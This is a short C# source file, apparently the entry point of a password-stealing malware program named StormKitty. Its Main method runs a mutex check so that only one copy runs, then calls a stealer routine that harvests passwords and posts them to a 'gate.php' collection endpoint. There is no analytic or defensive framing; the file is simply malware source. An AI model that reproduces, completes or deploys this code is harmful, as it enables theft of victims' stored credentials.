using Stealer;
using System;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.IO;
using System.Text;
using System.Threading;

namespace StormKitty
{
	
    class Program
    {
		
		 public static void Check()
        {
            bool createdNew = false;
            Mutex currentApp = new Mutex(false, "mutex", out createdNew);
            if (!createdNew) Environment.Exit(1);
        }
			
						
        [System.STAThreadAttribute]
        static void Main(string[] args)
        {			
			Check();
					
            string passwords = Passwords.Save("http://localhost/gate.php"); 
		}
		
    }
}
